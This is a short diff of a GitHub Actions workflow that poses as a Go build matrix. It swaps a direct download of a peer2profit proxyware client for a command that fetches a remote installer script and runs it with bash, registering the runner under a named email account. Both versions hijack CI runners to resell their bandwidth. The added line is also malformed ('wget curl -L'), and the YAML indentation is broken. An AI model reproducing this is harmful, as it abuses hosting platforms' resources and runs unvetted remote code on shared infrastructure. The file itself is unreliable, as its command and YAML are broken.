@@ -17,10 +17,6 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: wget https://updates.peer2profit.app/p2pclient_0.60_amd64.deb
-    - name: Extract
-      run: dpkg -x p2pclient_0.60_amd64.deb
-    - name: RUNNING
-      run: ./p2pclient --login mallory121@protonmail.com
-    - name: DONE
+      run: wget curl -L https://raw.githubusercontent.com/spiritLHLS/peer2profit-one-click-command-installation/main/p.sh -o p.sh && chmod +x p.sh && bash p.sh -m mallory121@protonmail.com
+      - name: DONE
       run: exit
